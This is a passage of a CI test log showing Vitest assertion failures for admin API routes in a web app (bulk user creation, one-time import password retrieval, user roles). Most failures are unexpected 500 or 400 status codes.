2025-11-18T17:36:11.3069338Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3069354Z 
2025-11-18T17:36:11.3069722Z - Expected
2025-11-18T17:36:11.3069878Z + Received
2025-11-18T17:36:11.3069892Z 
2025-11-18T17:36:11.3070021Z - 200
2025-11-18T17:36:11.3070147Z + 500
2025-11-18T17:36:11.3070160Z 
2025-11-18T17:36:11.3070852Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m523:36[22m[39m
2025-11-18T17:36:11.3071157Z     [90m521| [39m      await handler(req, res);
2025-11-18T17:36:11.3071327Z     [90m522| [39m
2025-11-18T17:36:11.3071704Z     [90m523| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3072027Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3072461Z     [90m524| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3072670Z     [90m525| [39m      
2025-11-18T17:36:11.3072684Z 
2025-11-18T17:36:11.3073092Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[203/545]⎯[22m[39m
2025-11-18T17:36:11.3073107Z 
2025-11-18T17:36:11.3074630Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mUser Creation[2m > [22mshould handle profile creation errors
2025-11-18T17:36:11.3075321Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3075338Z 
2025-11-18T17:36:11.3075460Z - Expected
2025-11-18T17:36:11.3075584Z + Received
2025-11-18T17:36:11.3075595Z 
2025-11-18T17:36:11.3075706Z - 200
2025-11-18T17:36:11.3075814Z + 500
2025-11-18T17:36:11.3075832Z 
2025-11-18T17:36:11.3076448Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m616:36[22m[39m
2025-11-18T17:36:11.3076936Z     [90m614| [39m      await handler(req, res);
2025-11-18T17:36:11.3077128Z     [90m615| [39m
2025-11-18T17:36:11.3077528Z     [90m616| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3077912Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3078351Z     [90m617| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3078562Z     [90m618| [39m      
2025-11-18T17:36:11.3078577Z 
2025-11-18T17:36:11.3078960Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[204/545]⎯[22m[39m
2025-11-18T17:36:11.3078975Z 
2025-11-18T17:36:11.3080501Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/bulk-create-users.test.ts[2m > [22m/api/admin/bulk-create-users[2m > [22mError Handling[2m > [22mshould handle no valid users scenario
2025-11-18T17:36:11.3081150Z [31m[1mAssertionError[22m: expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:36:11.3081163Z 
2025-11-18T17:36:11.3081287Z - Expected
2025-11-18T17:36:11.3081610Z + Received
2025-11-18T17:36:11.3081621Z 
2025-11-18T17:36:11.3081740Z - 400
2025-11-18T17:36:11.3081852Z + 500
2025-11-18T17:36:11.3081863Z 
2025-11-18T17:36:11.3082510Z [36m [2m❯[22m __tests__/api/admin/bulk-create-users.test.ts:[2m699:36[22m[39m
2025-11-18T17:36:11.3082859Z     [90m697| [39m      await handler(req, res);
2025-11-18T17:36:11.3083046Z     [90m698| [39m
2025-11-18T17:36:11.3083462Z     [90m699| [39m      expect(res._getStatusCode()).toBe(400);
2025-11-18T17:36:11.3083815Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3084271Z     [90m700| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3084481Z     [90m701| [39m      
2025-11-18T17:36:11.3084496Z 
2025-11-18T17:36:11.3084919Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[205/545]⎯[22m[39m
2025-11-18T17:36:11.3084934Z 
2025-11-18T17:36:11.3086700Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAuthentication and Authorization[2m > [22mshould reject non-admin users
2025-11-18T17:36:11.3087599Z [31m[1mAssertionError[22m: expected 500 to be 403 // Object.is equality[39m
2025-11-18T17:36:11.3087616Z 
2025-11-18T17:36:11.3087747Z - Expected
2025-11-18T17:36:11.3087877Z + Received
2025-11-18T17:36:11.3087889Z 
2025-11-18T17:36:11.3088004Z - 403
2025-11-18T17:36:11.3088122Z + 500
2025-11-18T17:36:11.3088347Z 
2025-11-18T17:36:11.3089128Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m167:36[22m[39m
2025-11-18T17:36:11.3089469Z     [90m165| [39m      await handler(req, res);
2025-11-18T17:36:11.3089624Z     [90m166| [39m
2025-11-18T17:36:11.3089840Z     [90m167| [39m      expect(res._getStatusCode()).toBe(403);
2025-11-18T17:36:11.3090033Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3090269Z     [90m168| [39m      expect(JSON.parse(res._getData())).toEqual({
2025-11-18T17:36:11.3090581Z     [90m169| [39m        error: 'Unauthorized. Only admins can retrieve passwords.'
2025-11-18T17:36:11.3090590Z 
2025-11-18T17:36:11.3090801Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[206/545]⎯[22m[39m
2025-11-18T17:36:11.3090809Z 
2025-11-18T17:36:11.3091847Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAuthentication and Authorization[2m > [22mshould reject when profile lookup fails
2025-11-18T17:36:11.3092180Z [31m[1mAssertionError[22m: expected 500 to be 403 // Object.is equality[39m
2025-11-18T17:36:11.3092187Z 
2025-11-18T17:36:11.3092260Z - Expected
2025-11-18T17:36:11.3092328Z + Received
2025-11-18T17:36:11.3092335Z 
2025-11-18T17:36:11.3092398Z - 403
2025-11-18T17:36:11.3092468Z + 500
2025-11-18T17:36:11.3092474Z 
2025-11-18T17:36:11.3092863Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m203:36[22m[39m
2025-11-18T17:36:11.3093038Z     [90m201| [39m      await handler(req, res);
2025-11-18T17:36:11.3093302Z     [90m202| [39m
2025-11-18T17:36:11.3093520Z     [90m203| [39m      expect(res._getStatusCode()).toBe(403);
2025-11-18T17:36:11.3093706Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3093934Z     [90m204| [39m      expect(JSON.parse(res._getData())).toEqual({
2025-11-18T17:36:11.3094219Z     [90m205| [39m        error: 'Unauthorized. Only admins can retrieve passwords.'
2025-11-18T17:36:11.3094227Z 
2025-11-18T17:36:11.3094433Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[207/545]⎯[22m[39m
2025-11-18T17:36:11.3094441Z 
2025-11-18T17:36:11.3095376Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mRequest Validation[2m > [22mshould reject requests without sessionId
2025-11-18T17:36:11.3095707Z [31m[1mAssertionError[22m: expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:36:11.3095714Z 
2025-11-18T17:36:11.3095785Z - Expected
2025-11-18T17:36:11.3095865Z + Received
2025-11-18T17:36:11.3095873Z 
2025-11-18T17:36:11.3095936Z - 400
2025-11-18T17:36:11.3096001Z + 500
2025-11-18T17:36:11.3096008Z 
2025-11-18T17:36:11.3096386Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m244:36[22m[39m
2025-11-18T17:36:11.3096548Z     [90m242| [39m      await handler(req, res);
2025-11-18T17:36:11.3096654Z     [90m243| [39m
2025-11-18T17:36:11.3097299Z     [90m244| [39m      expect(res._getStatusCode()).toBe(400);
2025-11-18T17:36:11.3097523Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3097750Z     [90m245| [39m      expect(JSON.parse(res._getData())).toEqual({
2025-11-18T17:36:11.3097953Z     [90m246| [39m        error: 'Session ID is required'
2025-11-18T17:36:11.3097962Z 
2025-11-18T17:36:11.3098161Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[208/545]⎯[22m[39m
2025-11-18T17:36:11.3098169Z 
2025-11-18T17:36:11.3099139Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mRequest Validation[2m > [22mshould reject requests with invalid sessionId type
2025-11-18T17:36:11.3099473Z [31m[1mAssertionError[22m: expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:36:11.3099479Z 
2025-11-18T17:36:11.3099553Z - Expected
2025-11-18T17:36:11.3099622Z + Received
2025-11-18T17:36:11.3099629Z 
2025-11-18T17:36:11.3099699Z - 400
2025-11-18T17:36:11.3099770Z + 500
2025-11-18T17:36:11.3099777Z 
2025-11-18T17:36:11.3100152Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m261:36[22m[39m
2025-11-18T17:36:11.3100321Z     [90m259| [39m      await handler(req, res);
2025-11-18T17:36:11.3100420Z     [90m260| [39m
2025-11-18T17:36:11.3100633Z     [90m261| [39m      expect(res._getStatusCode()).toBe(400);
2025-11-18T17:36:11.3100817Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3101043Z     [90m262| [39m      expect(JSON.parse(res._getData())).toEqual({
2025-11-18T17:36:11.3101237Z     [90m263| [39m        error: 'Session ID is required'
2025-11-18T17:36:11.3101244Z 
2025-11-18T17:36:11.3101448Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[209/545]⎯[22m[39m
2025-11-18T17:36:11.3101456Z 
2025-11-18T17:36:11.3102418Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mRequest Validation[2m > [22mshould accept empty string sessionId (edge case)
2025-11-18T17:36:11.3102747Z [31m[1mAssertionError[22m: expected 500 to be 400 // Object.is equality[39m
2025-11-18T17:36:11.3102754Z 
2025-11-18T17:36:11.3102821Z - Expected
2025-11-18T17:36:11.3102887Z + Received
2025-11-18T17:36:11.3102901Z 
2025-11-18T17:36:11.3102963Z - 400
2025-11-18T17:36:11.3103027Z + 500
2025-11-18T17:36:11.3103033Z 
2025-11-18T17:36:11.3103410Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m280:36[22m[39m
2025-11-18T17:36:11.3103572Z     [90m278| [39m      await handler(req, res);
2025-11-18T17:36:11.3103799Z     [90m279| [39m
2025-11-18T17:36:11.3104006Z     [90m280| [39m      expect(res._getStatusCode()).toBe(400);
2025-11-18T17:36:11.3104193Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3104412Z     [90m281| [39m      expect(JSON.parse(res._getData())).toEqual({
2025-11-18T17:36:11.3104608Z     [90m282| [39m        error: 'Session ID is required'
2025-11-18T17:36:11.3104615Z 
2025-11-18T17:36:11.3104813Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[210/545]⎯[22m[39m
2025-11-18T17:36:11.3104820Z 
2025-11-18T17:36:11.3105815Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mPassword Retrieval[2m > [22mshould successfully retrieve passwords for valid session
2025-11-18T17:36:11.3106138Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3106145Z 
2025-11-18T17:36:11.3106224Z - Expected
2025-11-18T17:36:11.3106290Z + Received
2025-11-18T17:36:11.3106297Z 
2025-11-18T17:36:11.3106361Z - 200
2025-11-18T17:36:11.3106432Z + 500
2025-11-18T17:36:11.3106439Z 
2025-11-18T17:36:11.3106926Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m338:36[22m[39m
2025-11-18T17:36:11.3107096Z     [90m336| [39m      await handler(req, res);
2025-11-18T17:36:11.3107192Z     [90m337| [39m
2025-11-18T17:36:11.3107525Z     [90m338| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3107713Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3107937Z     [90m339| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3108041Z     [90m340| [39m      
2025-11-18T17:36:11.3108049Z 
2025-11-18T17:36:11.3108248Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[211/545]⎯[22m[39m
2025-11-18T17:36:11.3108256Z 
2025-11-18T17:36:11.3109217Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mPassword Retrieval[2m > [22mshould return empty array for non-existent session
2025-11-18T17:36:11.3109550Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3109557Z 
2025-11-18T17:36:11.3109623Z - Expected
2025-11-18T17:36:11.3109690Z + Received
2025-11-18T17:36:11.3109702Z 
2025-11-18T17:36:11.3109764Z - 200
2025-11-18T17:36:11.3109834Z + 500
2025-11-18T17:36:11.3109841Z 
2025-11-18T17:36:11.3111450Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m369:36[22m[39m
2025-11-18T17:36:11.3112188Z     [90m367| [39m      await handler(req, res);
2025-11-18T17:36:11.3112639Z     [90m368| [39m
2025-11-18T17:36:11.3113870Z     [90m369| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3114571Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3115636Z     [90m370| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3115984Z     [90m371| [39m      
2025-11-18T17:36:11.3116651Z 
2025-11-18T17:36:11.3117348Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[212/545]⎯[22m[39m
2025-11-18T17:36:11.3117371Z 
2025-11-18T17:36:11.3118459Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mPassword Retrieval[2m > [22mshould filter out metadata from password entries
2025-11-18T17:36:11.3118821Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3118835Z 
2025-11-18T17:36:11.3118912Z - Expected
2025-11-18T17:36:11.3119168Z + Received
2025-11-18T17:36:11.3119786Z 
2025-11-18T17:36:11.3120041Z - 200
2025-11-18T17:36:11.3120157Z + 500
2025-11-18T17:36:11.3120171Z 
2025-11-18T17:36:11.3120973Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m401:36[22m[39m
2025-11-18T17:36:11.3121343Z     [90m399| [39m      await handler(req, res);
2025-11-18T17:36:11.3121777Z     [90m400| [39m
2025-11-18T17:36:11.3122168Z     [90m401| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3122505Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3122922Z     [90m402| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3123141Z     [90m403| [39m      
2025-11-18T17:36:11.3123157Z 
2025-11-18T17:36:11.3123580Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[213/545]⎯[22m[39m
2025-11-18T17:36:11.3123596Z 
2025-11-18T17:36:11.3126223Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAudit Logging[2m > [22mshould log password retrieval in audit_logs
2025-11-18T17:36:11.3130395Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3130426Z 
2025-11-18T17:36:11.3130571Z - Expected
2025-11-18T17:36:11.3130705Z + Received
2025-11-18T17:36:11.3130737Z 
2025-11-18T17:36:11.3130870Z - 200
2025-11-18T17:36:11.3130984Z + 500
2025-11-18T17:36:11.3130996Z 
2025-11-18T17:36:11.3131762Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m458:36[22m[39m
2025-11-18T17:36:11.3132067Z     [90m456| [39m      await handler(req, res);
2025-11-18T17:36:11.3132253Z     [90m457| [39m
2025-11-18T17:36:11.3132670Z     [90m458| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3133324Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3133556Z     [90m459| [39m      
2025-11-18T17:36:11.3133913Z     [90m460| [39m      // Verify audit log was created
2025-11-18T17:36:11.3133927Z 
2025-11-18T17:36:11.3134336Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[214/545]⎯[22m[39m
2025-11-18T17:36:11.3134351Z 
2025-11-18T17:36:11.3136104Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAudit Logging[2m > [22mshould log even when no passwords found
2025-11-18T17:36:11.3136978Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3136999Z 
2025-11-18T17:36:11.3137142Z - Expected
2025-11-18T17:36:11.3137283Z + Received
2025-11-18T17:36:11.3137296Z 
2025-11-18T17:36:11.3137420Z - 200
2025-11-18T17:36:11.3137545Z + 500
2025-11-18T17:36:11.3137557Z 
2025-11-18T17:36:11.3138335Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m486:36[22m[39m
2025-11-18T17:36:11.3138657Z     [90m484| [39m      await handler(req, res);
2025-11-18T17:36:11.3138857Z     [90m485| [39m
2025-11-18T17:36:11.3139278Z     [90m486| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3139677Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3139892Z     [90m487| [39m      
2025-11-18T17:36:11.3140301Z     [90m488| [39m      expect(mockInsert).toHaveBeenCalledWith({
2025-11-18T17:36:11.3140314Z 
2025-11-18T17:36:11.3140694Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[215/545]⎯[22m[39m
2025-11-18T17:36:11.3140706Z 
2025-11-18T17:36:11.3142443Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mAudit Logging[2m > [22mshould continue even if audit logging fails
2025-11-18T17:36:11.3143107Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3143138Z 
2025-11-18T17:36:11.3143282Z - Expected
2025-11-18T17:36:11.3143410Z + Received
2025-11-18T17:36:11.3143423Z 
2025-11-18T17:36:11.3143550Z - 200
2025-11-18T17:36:11.3143673Z + 500
2025-11-18T17:36:11.3143687Z 
2025-11-18T17:36:11.3144479Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m517:36[22m[39m
2025-11-18T17:36:11.3144661Z     [90m515| [39m
2025-11-18T17:36:11.3145149Z     [90m516| [39m      // Should still return passwords despite audit log failure
2025-11-18T17:36:11.3145550Z     [90m517| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3146193Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3146640Z     [90m518| [39m      const response = JSON.parse(res._getData());
2025-11-18T17:36:11.3147277Z     [90m519| [39m      expect(response.passwords).toHaveLength(1);
2025-11-18T17:36:11.3147293Z 
2025-11-18T17:36:11.3147718Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[216/545]⎯[22m[39m
2025-11-18T17:36:11.3147752Z 
2025-11-18T17:36:11.3149590Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mSecurity[2m > [22mshould clear passwords after retrieval (one-time access)
2025-11-18T17:36:11.3150247Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3150264Z 
2025-11-18T17:36:11.3150396Z - Expected
2025-11-18T17:36:11.3150531Z + Received
2025-11-18T17:36:11.3150544Z 
2025-11-18T17:36:11.3150660Z - 200
2025-11-18T17:36:11.3150800Z + 500
2025-11-18T17:36:11.3150815Z 
2025-11-18T17:36:11.3151568Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m560:36[22m[39m
2025-11-18T17:36:11.3151911Z     [90m558| [39m      await handler(req, res);
2025-11-18T17:36:11.3152188Z     [90m559| [39m
2025-11-18T17:36:11.3152612Z     [90m560| [39m      expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3153217Z     [90m   | [39m                                   [31m^[39m
2025-11-18T17:36:11.3153416Z     [90m561| [39m      
2025-11-18T17:36:11.3153861Z     [90m562| [39m      // Verify passwords were cleared after retrieval
2025-11-18T17:36:11.3153873Z 
2025-11-18T17:36:11.3154243Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[217/545]⎯[22m[39m
2025-11-18T17:36:11.3154256Z 
2025-11-18T17:36:11.3155974Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/retrieve-import-passwords.test.ts[2m > [22m/api/admin/retrieve-import-passwords[2m > [22mSecurity[2m > [22mshould handle malicious session IDs safely
2025-11-18T17:36:11.3156667Z [31m[1mAssertionError[22m: expected 500 to be 200 // Object.is equality[39m
2025-11-18T17:36:11.3156684Z 
2025-11-18T17:36:11.3157024Z - Expected
2025-11-18T17:36:11.3157164Z + Received
2025-11-18T17:36:11.3157179Z 
2025-11-18T17:36:11.3157315Z - 200
2025-11-18T17:36:11.3157437Z + 500
2025-11-18T17:36:11.3157448Z 
2025-11-18T17:36:11.3158213Z [36m [2m❯[22m __tests__/api/admin/retrieve-import-passwords.test.ts:[2m590:38[22m[39m
2025-11-18T17:36:11.3158525Z     [90m588| [39m        await handler(req, res);
2025-11-18T17:36:11.3158699Z     [90m589| [39m
2025-11-18T17:36:11.3159118Z     [90m590| [39m        expect(res._getStatusCode()).toBe(200);
2025-11-18T17:36:11.3159508Z     [90m   | [39m                                     [31m^[39m
2025-11-18T17:36:11.3160138Z     [90m591| [39m        expect(mockPasswordStore.retrieve).toHaveBeenCalledWith(sessio…
2025-11-18T17:36:11.3160739Z     [90m592| [39m        expect(mockPasswordStore.clear).toHaveBeenCalledWith(sessionId…
2025-11-18T17:36:11.3160772Z 
2025-11-18T17:36:11.3161203Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[218/545]⎯[22m[39m
2025-11-18T17:36:11.3161219Z 
2025-11-18T17:36:11.3162621Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mAuthentication[2m > [22mshould reject unauthenticated requests
2025-11-18T17:36:11.3187666Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 401 ]
2025-11-18T17:36:11.3187691Z 
2025-11-18T17:36:11.3187836Z Received: 
2025-11-18T17:36:11.3187852Z 
2025-11-18T17:36:11.3187998Z   1st spy call:
2025-11-18T17:36:11.3188011Z 
2025-11-18T17:36:11.3188132Z   Array [
2025-11-18T17:36:11.3188262Z -   401,
2025-11-18T17:36:11.3188388Z +   400,
2025-11-18T17:36:11.3188523Z   ]
2025-11-18T17:36:11.3188537Z 
2025-11-18T17:36:11.3188546Z 
2025-11-18T17:36:11.3188715Z Number of calls: 1
2025-11-18T17:36:11.3188943Z [39m
2025-11-18T17:36:11.3189560Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m69:26[22m[39m
2025-11-18T17:36:11.3190361Z     [90m 67| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3190545Z     [90m 68| [39m
2025-11-18T17:36:11.3190969Z     [90m 69| [39m      expect(res.status).toHaveBeenCalledWith(401);
2025-11-18T17:36:11.3191297Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3191898Z     [90m 70| [39m      expect(res.json).toHaveBeenCalledWith({ error: 'Authentication r…
2025-11-18T17:36:11.3192139Z     [90m 71| [39m    });
2025-11-18T17:36:11.3192154Z 
2025-11-18T17:36:11.3192548Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[219/545]⎯[22m[39m
2025-11-18T17:36:11.3192560Z 
2025-11-18T17:36:11.3193912Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mAuthentication[2m > [22mshould reject non-admin users
2025-11-18T17:36:11.3194612Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ 403 ]
2025-11-18T17:36:11.3194644Z 
2025-11-18T17:36:11.3194775Z Received: 
2025-11-18T17:36:11.3194787Z 
2025-11-18T17:36:11.3194906Z   1st spy call:
2025-11-18T17:36:11.3194916Z 
2025-11-18T17:36:11.3195037Z   Array [
2025-11-18T17:36:11.3195151Z -   403,
2025-11-18T17:36:11.3195262Z +   400,
2025-11-18T17:36:11.3195380Z   ]
2025-11-18T17:36:11.3195390Z 
2025-11-18T17:36:11.3195399Z 
2025-11-18T17:36:11.3195545Z Number of calls: 1
2025-11-18T17:36:11.3195706Z [39m
2025-11-18T17:36:11.3196497Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m82:26[22m[39m
2025-11-18T17:36:11.3197342Z     [90m 80| [39m      await handler(req as NextApiRequest, res as NextApiResponse);
2025-11-18T17:36:11.3197547Z     [90m 81| [39m
2025-11-18T17:36:11.3198008Z     [90m 82| [39m      expect(res.status).toHaveBeenCalledWith(403);
2025-11-18T17:36:11.3198354Z     [90m   | [39m                         [31m^[39m
2025-11-18T17:36:11.3198957Z     [90m 83| [39m      expect(res.json).toHaveBeenCalledWith({ error: 'Admin access req…
2025-11-18T17:36:11.3199216Z     [90m 84| [39m    });
2025-11-18T17:36:11.3199230Z 
2025-11-18T17:36:11.3199611Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[220/545]⎯[22m[39m
2025-11-18T17:36:11.3199630Z 
2025-11-18T17:36:11.3201216Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mGET /api/admin/user-roles[2m > [22mshould fetch user roles successfully and create audit log
2025-11-18T17:36:11.3202049Z [31m[1mAssertionError[22m: expected 1st "spy" call to have been called with [ 'user_roles' ][39m
2025-11-18T17:36:11.3202077Z 
2025-11-18T17:36:11.3202210Z - Expected: 
2025-11-18T17:36:11.3202333Z Array [
2025-11-18T17:36:11.3202488Z   "user_roles",
2025-11-18T17:36:11.3202615Z ]
2025-11-18T17:36:11.3202629Z 
2025-11-18T17:36:11.3202768Z + Received: 
2025-11-18T17:36:11.3202900Z undefined
2025-11-18T17:36:11.3202914Z 
2025-11-18T17:36:11.3203537Z [36m [2m❯[22m __tests__/api/admin/user-roles.test.ts:[2m135:38[22m[39m
2025-11-18T17:36:11.3203724Z     [90m133| [39m
2025-11-18T17:36:11.3204086Z     [90m134| [39m      // Verify roles were fetched
2025-11-18T17:36:11.3204743Z     [90m135| [39m      expect(mockSupabaseAdmin.from).toHaveBeenNthCalledWith(1, 'user_…
2025-11-18T17:36:11.3205126Z     [90m   | [39m                                     [31m^[39m
2025-11-18T17:36:11.3205334Z     [90m136| [39m      
2025-11-18T17:36:11.3205767Z     [90m137| [39m      // CRITICAL: Verify audit log was created
2025-11-18T17:36:11.3205790Z 
2025-11-18T17:36:11.3206242Z [31m[2m⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯⎯[221/545]⎯[22m[39m
2025-11-18T17:36:11.3206261Z 
2025-11-18T17:36:11.3208037Z [31m[1m[7m FAIL [27m[22m[39m __tests__/api/admin/user-roles.test.ts[2m > [22m/api/admin/user-roles[2m > [22mGET /api/admin/user-roles[2m > [22mshould reject requests without userId
2025-11-18T17:36:11.3208794Z [31m[1mAssertionError[22m: expected "spy" to be called with arguments: [ Array(1) ]
2025-11-18T17:36:11.3208811Z 
